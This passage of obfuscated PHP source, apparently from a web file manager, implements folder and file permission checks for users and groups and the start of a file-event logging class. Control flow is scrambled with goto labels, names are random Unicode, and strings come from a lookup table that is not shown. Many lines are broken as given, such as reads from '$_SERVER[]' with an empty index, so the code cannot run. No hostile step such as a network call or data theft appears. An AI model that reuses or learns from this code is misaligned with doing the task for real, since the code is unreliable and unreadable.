} goto Eʒ; c: foreach ($E̩ as $Eᢎ) { if (!in_array($Eᢎ[$bմ[404]], $cԶ)) { show_json(LNG($bմ[1870]), !1); } if ($C݅ != $CɃ) { if ($Eᢎ[$bմ[404]] == SourceModel::TYPE_GROUP) { } if ($Eᢎ[$bմ[484]] != 0 && !in_array($Eᢎ[$bմ[484]], $B)) { } } if ($Eᢎ[$bմ[484]] == 0) { $Eᢎ[$bմ[404]] = SourceModel::TYPE_USER; } $c[] = array($bմ[395] => $Dߐ, $bմ[404] => intval($Eᢎ[$bմ[404]]), $bմ[484] => intval($Eᢎ[$bմ[484]]), $bմ[1797] => intval($Eᢎ[$bմ[1797]]) ? intval($Eᢎ[$bմ[1797]]) : 0, $bմ[1851] => intval($Eᢎ[$bմ[1851]]) ? intval($Eᢎ[$bմ[1851]]) : -1); } $this->where(array($bմ[410] => $Dߐ))->delete(); $this->addAll($c); goto f쒔һ; E޿: if ($C݅ != $CɃ) { $dҙϡ = array($bմ[1702] => $C݅); $B = Model($bմ[1783])->field($bմ[1533])->where($dҙϡ)->select(); $B = array_to_keyvalue($B, $bմ[33], $bմ[1533]); } $cԶ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $c = array(); goto c; f쒔һ: return !0; goto D; D: } public function authClear($Cȸ鸓) { $fچ؉ =& $_SERVER[]; $a = Model($fچ؉[1209])->sourceInfo($Cȸ鸓); $d = array($Cȸ鸓); if ($a[$fچ؉[403]] == $fچ؉[87]) { $aиŖ = array($fچ؉[566] => array($fچ؉[525], $a[$fچ؉[502]] . $Cȸ鸓 . $fچ؉[526])); $d = Model($fچ؉[1209])->field($fچ؉[410])->where($aиŖ)->getField($fچ؉[395], !0); $d[] = $Cȸ鸓; } $this->where(array($fچ؉[410] => array($fچ؉[411], $d)))->delete(); return !0; } public function getAllChildren($c) { goto b̮; AՄ: if ($c钖[$cĭ[478]] == $cĭ[191] && $c钖[$cĭ[484]] != $F) { $Eï = $this->groupChidldAllRootSource($c钖[$cĭ[484]]); } $e¶ = $this->field($cĭ[395])->group($cĭ[395])->select(); $e¶ = array_to_keyvalue($e¶, $cĭ[33], $cĭ[395]); goto D; F圬: if ($c钖[$cĭ[404]] != SourceModel::TYPE_GROUP) { return array(); } $F = 1; $Eï = array($c); goto AՄ; d: return $this->sourceListAuth($F); goto dգ; b̮: $cĭ =& $_SERVER[]; $c钖 = Model($cĭ[1209])->sourceInfo($c); if ($c钖[$cĭ[403]] != $cĭ[87]) { return $this->sourceListAuth(array($c)); } goto F圬; D: if (!$e¶) { return array(); } $e־ = $cĭ[1871]; $D۴ބ = array($cĭ[395] => array($cĭ[7], $e¶), $cĭ[423] => $cĭ[191]); goto d̉; d̉: $F酄 = Model($cĭ[795])->field($e־)->where($D۴ބ)->select(); $F = array($c); foreach ($F酄 as $bԈ) { foreach ($Eï as $Dւ) { $Fƽ = $cĭ[47] . $Dւ . $cĭ[47]; $Bќ = $bԈ[$cĭ[502]] . $bԈ[$cĭ[395]] . $cĭ[47]; if (strstr($Bќ, $Fƽ)) { $F[] = $bԈ[$cĭ[395]]; break; } } } goto d; dգ: } private function sourceListAuth($d㞊) { goto Bٿ; Bٿ: $C =& $_SERVER[]; $D = Model($C[1209])->sourceListInfo($d㞊, !0); $b = $this->sourceAuthSelect($d㞊); goto bȪ; bȪ: $dȣɮ = array(); $fэβ = array(); foreach ($D as $dŚƌ) { goto D; D: unset($dŚƌ[$C[434]]); unset($dŚƌ[$C[432]]); unset($dŚƌ[$C[406]]); goto DⰎͤ; Dۍ: $d鉦 = count(explode($C[8], trim($dŚƌ[$C[500]], $C[8]))); $fэβ[] = $d鉦 + ($dŚƌ[$C[29]] == $C[77] ? 0 : 1000); goto fǒ; b: $dŚƌ[$C[1872]] = $this->authTargetInfo($Bʧѧ); $dŚƌ[$C[500]] = rtrim($dŚƌ[$C[506]], $C[8]) . $C[8] . ltrim($dŚƌ[$C[500]], $C[8]); $dȣɮ[] = $dŚƌ; goto Dۍ; DⰎͤ: unset($dŚƌ[$C[85]]); $Bʧѧ = $b[$dŚƌ[$C[395]]]; if (!$Bʧѧ) { continue; } goto b; fǒ: } goto dܐ; dܐ: array_multisort($fэβ, SORT_ASC, $dȣɮ); return $dȣɮ; goto b됊; b됊: } private function groupChidldAllRootSource($e⬑) { $f =& $_SERVER[]; $f = Model($f[1873])->groupChildrenAll($e⬑); $C = array($f[478] => 0, $f[484] => array($f[7], $f), $f[404] => SourceModel::TYPE_GROUP); $d = Model($f[795])->field($f[395])->where($C)->select(); $d = array_to_keyvalue($d, $f[33], $f[395]); return $d; } private function authTargetInfo($aߕ) { goto C; E٘: $a = 2 << 25; foreach ($aߕ as $FѠ) { goto Cȿ; C: if (!$Cۢ) { continue; } $Cۢ[$E[446]] = $eׄ; $FŲǫ߳[] = $Cۢ; goto aܑؔ; aܑؔ: $Cł = 0; if ($FѠ[$E[404]] == SourceModel::TYPE_GROUP) { $Cł = $a * 2; } if ($FѠ[$E[404]] == SourceModel::TYPE_USER) { $Cł = $a; } goto f݊ͩ; Cȿ: $eׄ = Model($E[488])->listData($FѠ[$E[1797]]); if (!$eׄ) { continue; } if ($FѠ[$E[404]] == SourceModel::TYPE_USER) { $Cۢ = Model($E[494])->getInfoSimpleOuter($FѠ[$E[484]]); if ($Cۢ[$E[1533]] == $E[1088]) { continue; } if ($Cۢ[$E[1533]] == $E[191]) { $Cۢ[$E[28]] = LNG($E[1874]); } } else { $Cۢ = Model($E[503])->getInfoSimple($FѠ[$E[484]]); } goto C; f݊ͩ: if ($FѠ[$E[404]] == SourceModel::TYPE_USER && $FѠ[$E[484]] == $E[191]) { $Cł = 0; } $Dؐ[] = $eׄ[$E[406]] + $Cł; goto B; B: } array_multisort($Dؐ, SORT_DESC, $FŲǫ߳); goto Cա; C: $E =& $_SERVER[]; $FŲǫ߳ = array(); $Dؐ = array(); goto E٘; Cա: return $FŲǫ߳; goto b; b: } public function getAllChildrenByUser($bİַ, $dԯ۰) { goto E; E: if ($aԹ[$dس[478]] == $dس[191] && $aԹ[$dس[484]] != $AĈ && $this->groupContainUser($aԹ[$dس[484]], $dԯ۰)) { foreach ($eن[$dس[1875]] as $E҂ݘ) { $F̆ = Model($dس[503])->getInfo($E҂ݘ[$dس[1702]]); $eҦً = Model($dس[519])->getInfoSimpleOuter($dԯ۰); $eҦً[$dس[446]] = $E҂ݘ[$dس[406]]; if (Model($dس[488])->authCheckAction($E҂ݘ[$dس[406]][$dس[406]], $dس[1722])) { continue; } $A = array($dس[28] => $dس[1485] . $F̆[$dس[28]], $dس[395] => $F̆[$dس[85]][$dس[395]], $dس[76] => KodIO::make($F̆[$dس[85]][$dس[395]]), $dس[478] => $dس[191], $dس[404] => $dس[496], $dس[29] => $dس[530], $dس[500] => $F̆[$dس[507]], $dس[1702] => $F̆[$dس[1702]], $dس[504] => $F̆[$dس[478]], $dس[1872] => array($eҦً)); $dͲ[$A[$dس[395]]] = $A; } } $cˇצ = array(); $cʇ = $this->getAllChildren($bİַ); goto Aב򅈡; Aב򅈡: foreach ($cʇ as $EǍ) { $CĉÌ = !1; foreach ($EǍ[$dس[1872]] as $EӐ) { if ($EӐ[$dس[1533]]) { if ($EӐ[$dس[1533]] == $dԯ۰) { $CĉÌ = !0; break; } } if ($EӐ[$dس[1702]]) { if ($this->groupContainUser($EӐ[$dس[1702]], $dԯ۰)) { $CĉÌ = !0; break; } } } if ($CĉÌ) { $cˇצ[] = $EǍ; } $Aۇ캭 = $EǍ[$dس[395]]; if (isset($dͲ[$Aۇ캭])) { $EǍ[$dس[1872]][] = $dͲ[$Aۇ캭][0]; $dͲ[$Aۇ캭] = !1; } } $dͲ = array_filter(array_values($dͲ)); $cˇצ = array_merge($dͲ, $cˇצ); goto d酰; d酰: return $cˇצ; goto f埐ţ; E: $dس =& $_SERVER[]; $eن = Model($dس[519])->getInfo($dԯ۰); if (!$dԯ۰ || !$bİַ || !$eن) { return array(); } goto eµѨ; eµѨ: $aԹ = Model($dس[1209])->sourceInfo($bİַ); $dͲ = array(); $AĈ = 1; goto E; f埐ţ: } public function setAllChildrenByUser($F, $dڳ, $d˃) { $fԌ =& $_SERVER[]; $e޶ = $this->getAllChildrenByUser($F, $dڳ); if (!$d˃ || !$e޶) { return !1; } foreach ($e޶ as $b) { $EаԆ = array(); foreach ($b[$fԌ[1872]] as $A) { $bȱ螃 = $A[$fԌ[446]]; $A̺ = $A[$fԌ[1533]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $f䥂 = $A[$fԌ[1533]] ? $A[$fԌ[1533]] : $A[$fԌ[1702]]; if ($A[$fԌ[1533]] && $A[$fԌ[1533]] == $dڳ) { continue; } $EаԆ[] = array($fԌ[395] => $b[$fԌ[395]], $fԌ[404] => $A̺, $fԌ[484] => intval($f䥂), $fԌ[1797] => isset($bȱ螃[$fԌ[393]]) ? intval($bȱ螃[$fԌ[393]]) : 0, $fԌ[1851] => isset($bȱ螃[$fԌ[1851]]) ? intval($bȱ螃[$fԌ[1851]]) : -1); } $EаԆ[] = array($fԌ[395] => $b[$fԌ[395]], $fԌ[404] => SourceModel::TYPE_USER, $fԌ[484] => intval($dڳ), $fԌ[1797] => intval($d˃), $fԌ[1851] => -1); $this->where(array($fԌ[410] => $b[$fԌ[395]]))->delete(); $this->addAll($EаԆ); } return !0; } public function get($B) { $Cȃ = $this->getSourceList(array($B), !0); return $Cȃ[0]; } public function getSourceList($e, $d = false, $C֞ = false) { goto bشˉ; Aʩ: $f = $this->userIsRoot($C֞); $bԇ΢м = AuthModel::authAll(); $d忉 = array($a[407] => $bԇ΢м, $a[1877] => array($a[412] => 0, $a[1708] => $bԇ΢м, $a[413] => LNG($a[1878]), $a[1724] => $a[1879])); goto D݊; Bó: if (!$d && count($e) == 1) { $d = array(); $d[$e[0]] = $c޴->sourceInfo($e[0]); } if (!$d) { $f鲯 = array($a[410] => array($a[411], $e)); $d = $c޴->field($a[1876])->where($f鲯)->select(); $d = array_to_keyvalue($d, $a[395]); } $d֮ = $e; goto Cз; bشˉ: $a =& $_SERVER[]; if (!$e) { return array(); } $c޴ = Model($a[1209]); goto Bó; B: $aﳢ = $this->sourceAuthSelect($d֮); $E떔 = array(); foreach ($d֮ as $a) { if (isset($aﳢ[$a])) { $E떔[$a] = $aﳢ[$a]; } } goto Aʩ; Cз: foreach ($d as $c => $d) { $aϰ = $c޴->parentLevelArray($d[$a[502]]); $d֮ = array_merge($d֮, array($c), array_reverse($aϰ)); } $d֮ = array_values(array_unique($d֮)); if (!$d֮) { return array(); } goto B; D݊: $B = array(); foreach ($d as $a => $Bդ) { if ($f) { $B[$a] = $d忉; continue; } $B[$a] = $this->makeSourceAuth($Bդ, $E떔, $C֞); } return $B; goto FЯ; FЯ: } public function authDeepCheck($cʌ, $Cʋ = false) { goto C͈; C͈: $E茰 =& $_SERVER[]; $Cʋ = $Cʋ ? $Cʋ : USER_ID; $F򧵼 = $this->makeAuthDeep($Cʋ); goto E뷭; ȅ: if (!$Aƫ) { return !1; } $eŠ = $Aƫ ? $Aƫ[0] : $cʌ; return array($E茰[407] => -1, $E茰[446] => array($E茰[412] => $E茰[1088], $E茰[1708] => $E茰[191], $E茰[413] => LNG($E茰[1882]), $E茰[1724] => $E茰[1883]), $E茰[1884] => LNG($E茰[1885]), $E茰[1886] => $this->sourceAuthInfo($eŠ)); goto d̐瘩; E뷭: if (!in_array($cʌ, $F򧵼[$E茰[1880]])) { return !1; } $Aƫ = array(); foreach ($F򧵼[$E茰[1881]] as $F => $eш) { if (!in_array($cʌ, $eш)) { continue; } $Aƫ[] = $F; } goto ȅ; d̐瘩: } protected function makeAuthDeep($D콿 = false) { goto D; D: $a =& $_SERVER[]; static $eڢ = array(); $D콿 = $D콿 ? $D콿 : USER_ID; goto e㜙; f䏖: foreach ($b؅ as $BĂʎ) { $Fәħ = $Bѻ㭖->getInfo($BĂʎ); $A⻫[] = $Fәħ[$a[85]][$a[395]]; $Eή[$BĂʎ] = $Fәħ[$a[85]][$a[395]]; $c۠[$BĂʎ] = $e->parentLevelArray($Fәħ[$a[502]]); } foreach ($Aٺ as $Dԯ => $EŃ) { $D = $Aѽ[$Dԯ]; if (!$D || !$Eή[$D]) { continue; } $E = array(); foreach ($c۠[$D] as $BĂʎ) { $E[] = $Eή[$BĂʎ]; } $Aٺ[$Dԯ] = array_merge($E, $EŃ); } $A⻫ = array_values(array_unique($A⻫)); goto B; eݺ: $bēǳ = array_to_keyvalue_group($d, $a[395]); foreach ($bēǳ as $bɗ => $a㊘) { $bŷ = $this->authArrayCheck($a㊘, $D콿); if ($bŷ[$a[407]] > 0) { $eҰ[] = $bɗ . $a[33]; } } $A⻫ = array(); goto Eᬹ; B: $c얄 = array($a[1880] => $A⻫, $a[1881] => $Aٺ); $eڢ[$D콿] = $c얄; return $c얄; goto c߃; Eᬹ: $b؅ = $EȰ; $e = Model($a[1209]); $Bѻ㭖 = Model($a[503]); goto A; e周Ӊ: foreach ($e윂 as $a) { if ($a[$a[406]] == 0 && $a[$a[1723]] == $a[87]) { $b龆[] = $a[$a[393]]; } } $EȰ = $this->userGroupParents($D콿); $F = array($a[404] => SourceModel::TYPE_USER, $a[484] => $D콿); goto bêۏ; bêۏ: if ($EȰ) { $F = array(array($a[404] => SourceModel::TYPE_USER, $a[484] => $D콿), array($a[404] => SourceModel::TYPE_GROUP, $a[484] => array($a[411], $EȰ)), $a[959] => $a[1789]); } $d = $this->field($a[1888])->where($F)->select(); $eҰ = array(); goto eݺ; b: $c۠ = array(); if ($eҰ) { $B = $e->where(array($a[395] => array($a[411], $eҰ)))->select(); foreach ($B as $F) { $Cľꈂ = $e->parentLevelArray($F[$a[502]]); $A⻫ = array_merge($A⻫, $Cľꈂ); $b؅[] = $F[$a[484]]; $Aٺ[$F[$a[395]]] = $Cľꈂ; $Aѽ[$F[$a[395]]] = $F[$a[484]]; } } $b؅ = array_values(array_unique($b؅)); goto B; B: $bшڋ = $b؅; foreach ($bшڋ as $BĂʎ) { $Fәħ = $Bѻ㭖->getInfo($BĂʎ); $Cľꈂ = $e->parentLevelArray($Fәħ[$a[502]]); $b؅ = array_merge($b؅, $Cľꈂ); } $b؅ = array_values(array_unique($b؅)); goto f䏖; e㜙: if (isset($eڢ[$D콿])) { return $eڢ[$D콿]; } $e윂 = Model($a[1887])->listData(); $b龆 = array(); goto e周Ӊ; A: $Aٺ = array(); $Aѽ = array(); $Eή = array(); goto b; c߃: } private function makeSourceAuth($aٓ, $e긤, $bԾ = false) { goto aՇ; b: $e = Model($e򆌂[1209])->parentLevelArray($aٓ[$e򆌂[502]]); $e = array_merge(array($aٓ[$e򆌂[395]]), array_reverse($e)); $B = !1; goto a; c: $c = $aٓ[$e򆌂[404]] == SourceModel::TYPE_GROUP; $Dѻ = $c ? $this->groupRootAuth($cԋ, $bԾ) : !1; if ($Dѻ && Model($e򆌂[488])->authCheckAction($Dѻ[$e򆌂[406]], $e򆌂[1722])) { return $this->groupAuthInfo($Dѻ, $cԋ); } goto b; aՇ: $e򆌂 =& $_SERVER[]; $aϻ؍ = $e򆌂[87]; $cԋ = $aٓ[$e򆌂[484]]; goto c; bȭ: if (!$B) { $ǎˬ = Model($e򆌂[503])->getInfo($cԋ); $Fް = explode($e򆌂[47], trim($ǎˬ[$e򆌂[502]], $e򆌂[47])); $Fް = array_reverse($Fް); foreach ($Fް as $EŸ) { if ($EŸ == $e򆌂[191] || $EŸ == $aϻ؍) { continue; } $Bۚ = $this->groupRootAuth($EŸ, $bԾ); if (!$Bۚ) { continue; } $B = $this->groupAuthInfo($Bۚ, $EŸ); break; } } if (!$B || $B[$e򆌂[407]] <= 0) { $f = $this->authDeepCheck($aٓ[$e򆌂[395]], $bԾ); if ($f) { $B = $f; } } return $B; goto C蒏; a: foreach ($e as $Aћƛ) { if (!isset($e긤[$Aћƛ])) { continue; } $f = $this->authMake($e긤[$Aћƛ], $bԾ); if ($f[$e򆌂[446]]) { $B = $f; break; } } if (!$c) { return $B; } if (!$B && $Dѻ) { $B = $this->groupAuthInfo($Dѻ, $cԋ); } goto bȭ; C蒏: } private function userIsRoot($fڋ쑻 = false) { $C䤋 =& $_SERVER[]; if (!$fڋ쑻 && _get($GLOBALS, $C䤋[485])) { return !0; } $eğ = Model($C䤋[519])->getInfo($fڋ쑻); $E߲ = Model($C䤋[1889])->listData($eğ[$C䤋[1416]]); if ($E߲ && $E߲[$C䤋[492]][$C䤋[1890]] == 1) { return !0; } return !1; } private function sourceAuthInfo($F۵) { goto d; Aڌߛ: if (!$E) { return !1; } $Cԉ䶆->groupPathDisplay($E); $bӰҹ = array($E); goto c; aϸƉ: if (isset($E[$D˶[508]])) { $a = explode($D˶[8], trim($E[$D˶[500]], $D˶[8])); array_shift($a); $Dߟ = $E[$D˶[506]] . $D˶[1891] . implode($D˶[8], $a); } return array($D˶[413] => $E[$D˶[28]], $D˶[76] => KodIO::make($E[$D˶[395]]), $D˶[1892] => $Dߟ); goto Fےڮ; c: $bӰҹ = $Cԉ䶆->_listAppendPath($bӰҹ); $E = $bӰҹ[0]; $Dߟ = $E[$D˶[500]]; goto aϸƉ; d: $D˶ =& $_SERVER[]; $Cԉ䶆 = Model($D˶[1209]); $E = $Cԉ䶆->sourceInfo($F۵); goto Aڌߛ; Fےڮ: } private function groupAuthInfo($c, $aާ) { $f =& $_SERVER[]; $A = Model($f[503])->getInfo($aާ); return array($f[1893] => intval($c[$f[406]]), $f[1877] => $c, $f[1894] => LNG($f[1895]), $f[1886] => array($f[413] => $A[$f[28]], $f[76] => KodIO::make($A[$f[85]][$f[395]]), $f[1892] => $A[$f[507]])); } protected function groupRootAuth($EӢ, $E = false) { goto D򟚒; e: $D = $this->userGroupList($E); $Bޭ = isset($D[$EӢ]) ? $D[$EӢ][$CÃՕ[406]] : !1; if ($Bޭ && Model($CÃՕ[488])->authCheckAction($Bޭ[$CÃՕ[406]], $CÃՕ[1722])) { $Dߞ[$Aא] = $Bޭ; return $Bޭ; } goto Fݿƚ; Fݿƚ: $Eɉ = $this->sourceAuthSelect($b[$CÃՕ[85]][$CÃՕ[395]]); $C = $Eɉ ? $this->authMake($Eɉ, $E) : !1; $d𗯄 = $C ? $C[$CÃՕ[446]] : !1; goto Bӱ; D򟚒: $CÃՕ =& $_SERVER[]; $E = $E ? $E : USER_ID; $Aא = $E . $CÃՕ[1896] . $EӢ; goto BӸ; BӸ: static $Dߞ = array(); if (isset($Dߞ[$Aא])) { return $Dߞ[$Aא]; } $b = Model($CÃՕ[503])->getInfo($EӢ); goto e; Bӱ: $Dߞ[$Aא] = $d𗯄 ? $d𗯄 : $Bޭ; return $Dߞ[$Aא]; goto b; b: } public function authOwnerApply($eύ) { goto EȐ; EȐ: $cǓ =& $_SERVER[]; if (empty($eύ[$cǓ[406]]) || isset($eύ[$cǓ[1897]]) && $eύ[$cǓ[1897]]) { return $eύ; } if (AuthModel::authCheckRoot($eύ[$cǓ[406]][$cǓ[407]])) { return $eύ; } goto cҵ; Bߟ: $eύ[$cǓ[406]][$cǓ[1899]] = Model($cǓ[494])->userListInfo($D); return $eύ; goto Fܼ܌; A: if (count($D) == 0) { $D = $this->authFolderOwnerGroup($eύ[$cǓ[484]]); } $D = array_unique($D); if (AuthModel::authCheckRoot($eύ[$cǓ[406]][$cǓ[407]])) { $D[] = USER_ID; } goto Bߟ; F㺩놘: $fѥӑ = array(); $D = array(); foreach ($f as $Aп => $D) { $A = $this->authFolderOwnerUser($D); $fѥӑ[$Aп] = $A; $D = array_merge($D, $A[$cǓ[575]]); if ($A[$cǓ[1898]]) { break; } } goto A; cҵ: $fŗ = Model($cǓ[1209])->parentLevelArray($eύ[$cǓ[502]]); $fŗ = array_merge(array($eύ[$cǓ[395]]), array_reverse($fŗ)); $f = $this->sourceAuthSelect($fŗ); goto F㺩놘; Fܼ܌: } private function authFolderOwnerGroup($cڧТ) { $C =& $_SERVER[]; $BÐڬ = Model($C[1783])->where(array($C[1702] => $cڧТ))->select(); $B = array(); if (!$BÐڬ) { return $B; } foreach ($BÐڬ as $Cݜ) { $bڄ = $this->authInfo($Cݜ); if (AuthModel::authCheckRoot($bڄ[$C[406]])) { $B[] = $Cݜ[$C[1533]]; } } return $B; } private function authFolderOwnerUser($e޸) { $A =& $_SERVER[]; $D = array(); $Dѿ = !1; foreach ($e޸ as $cقݽ¡) { $bǥ = $this->authInfo($cقݽ¡); if ($cقݽ¡[$A[484]] == $A[191]) { $Dѿ = !0; } if ($cقݽ¡[$A[404]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($bǥ[$A[406]])) { $D[] = $cقݽ¡[$A[484]]; } } } return array($A[575] => $D, $A[1898] => $Dѿ); } public function authMake($dЋ, $d˥ = false) { $EȘ =& $_SERVER[]; $A = $this->authArrayCheck($dЋ, $d˥); if ($A[$EȘ[1900]]) { $A[$EȘ[1900]] = $this->sourceAuthInfo($A[$EȘ[1900]]); } return $A; } public function authArrayCheck($dΛ퐚, $C̜ = false) { goto B䍋; B䍋: $Bٺï =& $_SERVER[]; if (!$dΛ퐚) { return array($Bٺï[407] => 0, $Bٺï[446] => !1); } $C̜ = $C̜ ? $C̜ : USER_ID; goto BԺ; a²: foreach ($dΛ퐚 as $Cؠ) { $Aъ = $this->authInfo($Cؠ); if (!$Aъ) { continue; } $Aݼᅜ = $Cؠ[$Bٺï[484]]; $c = intval($Aъ[$Bٺï[406]]); if ($Cؠ[$Bٺï[404]] == SourceModel::TYPE_USER && $Aݼᅜ == $C̜) { $C쏠 = !0; $B = $Aъ; $fﷇ亐 = $c; } else { if ($Cؠ[$Bٺï[404]] == SourceModel::TYPE_GROUP && $this->groupContainUser($Aݼᅜ, $C̜)) { $f = !0; $EЉ³ = $this->groupStepToUserGroup($Aݼᅜ, $C̜); if ($EЉ³ < $c͠⤙) { $c͠⤙ = $EЉ³; $cã = $c; $D͠ = $Aъ; $Aӥ = $Aݼᅜ; } if ($EЉ³ == $c͠⤙ && $c >= $cã) { $cã = $c; $D͠ = $Aъ; $Aӥ = $Aݼᅜ; } } else { if ($Aݼᅜ == $Bٺï[191]) { $E釄 = !0; $F = $Aъ; $aѐΏ = $c; } } } } if ($C쏠) { $Cҝ = $fﷇ亐; $Aъ = $B; $Dԑ = LNG($Bٺï[1901]); } else { if ($f) { $Cҝ = $cã; $Aъ = $D͠; $fڊ = Model($Bٺï[503])->getInfo($Aӥ); $Dԑ = $Bٺï[160] . $fڊ[$Bٺï[507]] . $Bٺï[1902] . LNG($Bٺï[1903]); } else { if ($E釄) { $Cҝ = $aѐΏ; $Aъ = $F; $Dԑ = LNG($Bٺï[1874]); } else { $Cҝ = 0; $Aъ = !1; $Dԑ = $Bٺï[33]; } } } $f߇ = array($Bٺï[1893] => intval($Cҝ), $Bٺï[1877] => $Aъ, $Bٺï[1894] => $Dԑ, $Bٺï[1886] => $Cؠ[$Bٺï[395]]); goto cڠ; cڠ: return $f߇; goto Fф٦; E: $aѐΏ = 0; $F = 0; $Cؠ = array($Bٺï[395] => 0); goto a²; E˂ѵ: $f = 0; $cã = 0; $D͠ = 0; goto cÃ; cÃ: $c͠⤙ = 1000; $Aӥ = 0; $E釄 = 0; goto E; BԺ: $C쏠 = 0; $fﷇ亐 = 0; $B = 0; goto E˂ѵ; Fф٦: } private function groupContainUser($bݻ, $Aƍܰ = false) { return in_array($bݻ, $this->userGroupParents($Aƍܰ)); } private function groupStepToUserGroup($d, $Fø = false) { goto B; B: $e =& $_SERVER[]; $dޝڡ = $this->userGroupList($Fø); $F׈ = 1000; goto Dڑ; Dڑ: $CœƄ = $GLOBALS[$e[6]][$e[88]][$e[1794]] == 1; $A晈 = $CœƄ ? 3 : 2; foreach ($dޝڡ as $a) { if ($a[$e[1702]] == $d) { return 0; } $aˆ = explode($e[47], trim($a[$e[502]], $e[47])); if ($aˆ[0] == $e[191] && count($aˆ) > $A晈) { $E֌ = array_reverse(array_slice($aˆ, $A晈)); $Fŋ = array_search($d, $E֌); if ($Fŋ !== !1 && $Fŋ + 1 <= $F׈) { $F׈ = $Fŋ + 1; } } } goto Eګ; Eګ: return $F׈; goto F; F: } private function userGroupList($b鬼 = false) { $D̯ =& $_SERVER[]; static $Eۿ = array(); if (isset($Eۿ[$b鬼])) { return $Eۿ[$b鬼]; } $Dǻ = Model($D̯[519])->getInfo($b鬼); $Eۿ[$b鬼] = array_to_keyvalue($Dǻ[$D̯[1875]], $D̯[1702]); return $Eۿ[$b鬼]; } public function userGroupParents($c) { goto e֤; c˨ȋ: $eӵ = $GLOBALS[$D󞆱[6]][$D󞆱[88]][$D󞆱[1794]] == 1; $b = $eӵ ? 3 : 2; foreach ($cуע as $e̐) { $bċސ = array($e̐[$D󞆱[1702]]); $FϾ = explode($D󞆱[47], trim($e̐[$D󞆱[502]], $D󞆱[47])); if ($FϾ[0] == $D󞆱[191] && count($FϾ) > $b) { $Fς = array_slice($FϾ, $b); $bċސ = array_merge($bċސ, array_reverse($Fς)); } $c = array_merge($c, $bċސ); } goto cϼ; BŅ: if (isset($C͎̩Ơ[$c])) { return $C͎̩Ơ[$c]; } $cуע = $this->userGroupList($c); $c = array(); goto c˨ȋ; e֤: $D󞆱 =& $_SERVER[]; static $C͎̩Ơ = array(); $c = $c ? $c : USER_ID; goto BŅ; cϼ: $C͎̩Ơ[$c] = array_unique($c); return $C͎̩Ơ[$c]; goto e; e: } public function authTargetInfoMake($Dä) { goto a; a: $C =& $_SERVER[]; $C = array(); $E = array(); goto c; ẽϦ: return array($C[1905] => $C, $C[1906] => $E); goto aՏ; c: foreach ($Dä as $bۉ) { if ($bۉ[$C[404]] == SourceModel::TYPE_USER) { $C[] = intval($bۉ[$C[484]]); } else { if ($bۉ[$C[404]] == SourceModel::TYPE_GROUP) { $E[] = intval($bۉ[$C[484]]); } } } if ($C) { $C = Model($C[494])->userListInfo($C); } if ($E) { $dʪ = array($C[1780] => array($C[411], $E)); $E = Model($C[503])->field($C[1904])->where($dʪ)->select(); $E = array_to_keyvalue($E, $C[1702]); } goto ẽϦ; aՏ: } public function authInfo($A) { $E =& $_SERVER[]; if ($A[$E[1797]]) { $dȻ = Model($E[488])->listData($A[$E[1797]]); if (!$dȻ) { return !1; $e = Model($E[488])->listData(); $A = array_filter_by_field($e, $E[406], $E[191]); return $A; } $C͸ = array_field_key($dȻ, array($E[393], $E[28], $E[406], $E[1724], $E[1725])); $C͸[$E[1907]] = $A; return $C͸; } else { return array($E[412] => 0, $E[1708] => $A[$E[1851]], $E[413] => $E[33], $E[1724] => $E[1908]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\x65\137\x65\x76\145\x6e\164"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\124\x69\x6d\145", "\x74\151\155\x65", "\x69\x6e\163\145\162\x74", "\x66\x75\x6e\143\164\151\x6f\x6e"), array("\144\145\163\143", '', "\151\156\x73\145\162\164\54\165\160\144\x61\164\x65\54\163\145\154\145\143\164", "\152\163\157\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($E㦨, $f, $Cݙ = '') { goto b邱; b邱: $F =& $_SERVER[]; if (!$this->eventSave) { return; } $a = Model($F[1209])->sourceInfo($E㦨); goto C; d: return $this->add($fĢ); goto Aΐ; C: if (!$a) { return !1; } if ($this->isCacheEvent($a, $f)) { return; } if ($Cݙ && is_string($Cݙ)) { $Cݙ = array($F[1735] => $Cݙ); } goto Dە; Dە: $fĢ = array($F[410] => $E㦨, $F[1909] => $a[$F[478]], $F[1910] => $a[$F[28]], $F[500] => !empty($a[$F[500]]) ? $a[$F[500]] : $F[33], $F[1524] => USER_ID, $F[415] => $f, $F[1526] => $Cݙ); $this->addSystemLog($f, $fĢ); unset($fĢ[$F[1910]], $fĢ[$F[500]]); goto d; Aΐ: } private function addSystemLog($bĄ, $e٫ɐ) { $A؊ޗ =& $_SERVER[]; if ($bĄ == $A؊ޗ[1911]) { $bĄ = $e٫ɐ[$A؊ޗ[431]][$A؊ޗ[1912]]; } else { if (in_array($bĄ, array($A؊ޗ[1679], $A؊ޗ[1913]))) { $bĄ = $e٫ɐ[$A؊ޗ[431]][$A؊ޗ[720]]; } } $A = array_merge($e٫ɐ, array($A؊ޗ[1914] => $e٫ɐ[$A؊ޗ[395]], $A؊ޗ[1915] => $e٫ɐ[$A؊ޗ[1915]])); Model($A؊ޗ[1643])->addLog($A؊ޗ[1916] . $bĄ, $A); } private function isCacheEvent($Cڊ, $a൭) { if ($Cڊ[$_SERVER[][404]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($Aы評, $b) { $Cɋ =& $_SERVER[]; $Aܔ = Model($Cɋ[1209])->sourceInfo($Aы評); $b = array($Cɋ[1912] => $b, $Cɋ[28] => $Aܔ[$Cɋ[28]]); return $this->addEvent($Aы評, $Cɋ[1911], $b); } public function eventFileEdit($F) { $Dٺ =& $_SERVER[]; $d = array($Dٺ[1917] => $_SERVER[$Dٺ[1918]], $Dٺ[1919] => strtolower(ACTION)); return $this->addEvent($F, $Dٺ[1669], $d); } public function eventRecycle($f, $Eϰъ) { return $this->addEvent($f, $_SERVER[][1913], $Eϰъ); } public function eventRemove($dή㐷) { $fǅਞ =& $_SERVER[]; $dڐ = Model($fǅਞ[1209])->sourceInfo($dή㐷); $bĸ = $dڐ[$fǅਞ[28]]; return $this->addEvent($dڐ[$fǅਞ[478]], $fǅਞ[1668], $bĸ); } public function eventShare($a͔, $Eſ) { return $this->addEvent($a͔, $_SERVER[][1679], $Eſ); } public function eventMove($b׍, $c׺, $Cȿ) { goto d; d: $C߰펰 =& $_SERVER[]; 